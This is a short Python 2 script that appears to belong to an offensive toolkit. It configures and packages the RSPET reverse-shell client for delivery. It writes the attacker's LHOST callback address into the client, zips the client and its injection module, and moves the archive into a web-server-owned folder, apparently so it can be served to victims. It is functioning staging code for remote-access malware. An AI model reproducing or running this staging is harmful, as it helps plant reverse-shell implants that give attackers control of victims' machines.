# -*- coding: utf-8 -*-
import os
import subprocess
import shutil
import sys
from config_paths import *

main_save_path = main_path+"RSPET/"

def main_directory():
    if os.path.exists(main_save_path):
        shutil.rmtree(main_save_path)
    os.makedirs(main_save_path)


###############
## MAIN PART ##
###############
print ""
print "#################################################"
print "RSPET:"
if len(sys.argv) > 1:
    if ip_validator(sys.argv[1]):
        LHOST = sys.argv[1]
    else:
        print "Give a correct Ip address"
        exit(-1)
else:
    LHOST = autoLHOST()
    print "Using IP: "+LHOST

print "Default RSPET's port is 9000, change it in pupy.conf"
main_directory()

print ""
print "#################################################"
print "MOVING RSPET:"
print "-------------------------------------------------"
try:
    subprocess.check_output("echo "+ LHOST +" > "+ rspet_path +"Client/ip.txt", shell=True)
    os.chdir(rspet_path)
    comando = "zip "+ main_save_path +"rspet.zip Client/pinject/* Client/*"
    print comando
    subprocess.check_output(comando, shell=True)
except subprocess.CalledProcessError as e:
    print "Couldn't compress and move the folder"
print "_________________________________________________"
os.system("chown www-data -R "+main_save_path)
